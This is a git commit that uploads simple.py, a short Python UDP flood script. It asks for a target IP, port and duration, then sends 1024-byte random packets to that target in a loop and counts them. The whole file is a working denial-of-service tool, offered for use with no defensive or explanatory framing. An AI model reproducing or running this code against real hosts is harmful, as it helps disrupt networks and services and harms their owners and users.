802f84045c02d2a6900b3fb58a24039271d7650f
w1zzxyz9810 <109500807+w1zzxyz9810@users.noreply.github.com>
2023-03-07 03:41:08 +0700

    Add files via upload

---
+++ simple.py
@@ -0,0 +1,33 @@
+import os
+
+import sys
+
+import time
+import socket
+import random
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1024)
+
+os.system("clear")
+print("Welcome!")
+print("")
+ip = input("Enter target ip : ")
+port = int(input("Enter target port : "))
+dur = int(input("Enter duration : "))
+timeout = time.time() + dur
+sent = 0
+
+while True:
+    try:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        sock.sendto(bytes, (ip, port))
+        sent = sent + 1
+        print("Sent",sent,"packets to",ip,"through",port,)
+    except KeyboardInterrupt:
+        sys.exit()
+
+help = input("Press any key to continue...")
